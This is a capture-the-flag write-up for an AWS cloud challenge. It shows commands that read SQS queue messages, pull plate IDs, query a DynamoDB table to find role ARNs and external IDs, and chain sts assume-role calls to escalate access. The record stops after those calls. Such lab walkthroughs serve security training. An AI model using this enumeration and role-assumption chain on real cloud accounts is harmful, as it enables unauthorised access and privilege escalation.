---
tags:
  - ctf
  - aws
difficulty: hard
category: cloud
---
# Challenge

Rin Kagetsura finds that Vaultrune has sealed a small service gate below Crownspire's outer wall. Stormbound's medics and supply carts use that gate because the main road is watched, but Vaultrune has replaced the old lock with new parts and posted guards nearby. If the gate stays shut, the wounded inside the city lose their medicine and the soldiers at the east road lose their food. Rin cannot break the lock in front of the guards because they will seal the whole passage. She has to enter through an old maintenance tunnel, open the gate without leaving clear signs of a break-in, and get the supplies moving before nightfall.

The service gate's current lock plate is buried among custody notices and maintenance work orders. Your Registry outer clerk access covers `registry-plate-notify-queue`, `registry-maintenance-queue`, and the `registry-plate-index` table. Correlate those records to identify the live plate.
## Solution

The environment is a docker container and provides and IP address with 2 ports

```ip
154.57.164.80:32625
```

```ip
154.57.164.80:31228
```

```bash
aws sqs receive-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/728491650384/registry-maintenance-queue \ 
  --max-number-of-messages 10 \
  --attribute-names All
```

```bash
aws sqs receive-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/728491650384/registry-maintenance-queue \
  --max-number-of-messages 10 \
  --attribute-names All > registry_maintenance_queue.json
```

```bash
aws sqs receive-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/728491650384/registry-maintenance-queue \
  --max-number-of-messages 10 \
  --attribute-names All \
  --message-attribute-names All | grep plate_id | sed -E 's/.*\\"plate_id\\": \\"([^"\\]+)\\".*/\1/' > plate_ids
```

```bash
for id in $(cat plate_ids); do aws dynamodb get-item --table-name registry-plate-index --key "{\"plate_id\": {\"S\": \"$id\"}}" >> registry_plate_index.json; done;
```

One of the plates in that list is different than the others and has a few user ARNs and External IDs that we might be able to assume.

```bash
jq '. | select(.Item.plate_id.S == "PLATE-4E8C")' registry_plate_index.json
```

```bash
aws sts assume-role \      
  --role-arn arn:aws:iam::728491650384:role/registry-custody-reader \ 
  --role-session-name registry-shard-stack-live \
  --external-id registry-job-custody-4e8c
```

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::728491650384:role/registry-indexer \       
  --role-session-name registry-shard-stack-live \
  --external-id registry-indexer-relay-4e8c
```

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::728491650384:role/registry-verifier-runner \
  --role-session-name registry-shard-stack-live \
  --external-id registry-verifier-bind-4e8c
```

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::728491650384:role/shard-custodian \         
  --role-session-name registry-shard-stack-live \
  --external-id registry-custodian-seal-4e8c
```

